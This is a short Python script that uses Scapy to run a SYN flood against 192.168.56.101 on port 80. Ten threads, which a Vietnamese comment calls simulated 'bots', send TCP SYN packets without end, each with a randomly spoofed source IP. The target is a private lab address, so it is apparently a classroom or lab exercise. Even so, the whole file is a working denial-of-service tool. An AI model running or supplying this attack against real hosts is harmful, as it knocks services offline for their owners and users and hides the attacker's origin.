from scapy.all import *
import threading
import random
import time

target_ip = "192.168.56.101"
target_port = 80

def bot_thread():
    while True:
        ip = IP(src=RandIP(), dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip / tcp
        send(packet, verbose=0)
        time.sleep(0.01)

# Tạo 10 "bot" giả lập
for i in range(10):
    t = threading.Thread(target=bot_thread)
    t.start()
